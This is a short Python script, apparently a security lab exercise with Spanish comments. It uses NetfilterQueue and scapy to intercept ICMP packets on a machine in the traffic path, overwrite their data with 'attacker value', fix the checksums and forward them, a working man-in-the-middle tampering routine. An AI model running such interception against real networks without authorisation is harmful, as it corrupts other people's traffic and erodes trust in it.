from netfilterqueue import NetfilterQueue
from scapy.all import IP, ICMP, Raw

def recalculate(pkt):
    """
    Recalcula los campos de longitud y checksum del paquete IP e ICMP.

    Args:
        pkt (scapy.packet.Packet): El paquete a recalcular.

    Returns:
        scapy.packet.Packet: El paquete con los campos recalculados.
    """
    # Eliminamos los campos que Scapy debe recalcular
    if IP in pkt:
        del pkt[IP].len
        del pkt[IP].chksum
    if ICMP in pkt:
        del pkt[ICMP].chksum

    pkt = pkt.__class__(bytes(pkt))
    return pkt

def intercept(packet):
    """
    Intercepta y modifica los paquetes ICMP, cambiando su payload.

    Args:
        packet (netfilterqueue.Packet): El paquete interceptado de la cola de netfilter.
    """
    try:
        payload = packet.get_payload()
        spkt = IP(payload)

        # Mostrar información básica del paquete
        print("Ha llegado un nuevo paquete:", spkt.summary())

        # Solo tocamos ICMP y solo si lleva capa Raw (datos)
        if spkt.haslayer(ICMP) and spkt.haslayer(Raw):
            print("Datos originales:", repr(spkt[Raw].load))

            # Modificar el payload del paquete ICMP (usar bytes en Python 3)
            spkt[Raw].load = b"attacker value"

            # Mostrar el paquete modificado
            spkt.show()

            # Recalcular los campos de control
            spkt = recalculate(spkt)

        # Reenviar el paquete (modificado o no)
        packet.set_payload(bytes(spkt))
        packet.accept()

    except Exception as e:
        # Si algo falla, lo mostramos pero no dejamos que la cola muera
        print("[!] Error procesando paquete:", e)
        try:
            packet.accept()
        except Exception:
            # Si incluso aquí falla, por lo menos no reventamos el programa
            pass

if __name__ == "__main__":
    nfqueue = NetfilterQueue()

    # Enlazar la cola de netfilter con la función interceptora.
    nfqueue.bind(1, intercept)

    try:
        print("Escaneando paquetes de manera activa...")
        nfqueue.run()
    except KeyboardInterrupt:
        print("\nSaliendo por KeyboardInterrupt...")
    finally:
        nfqueue.unbind()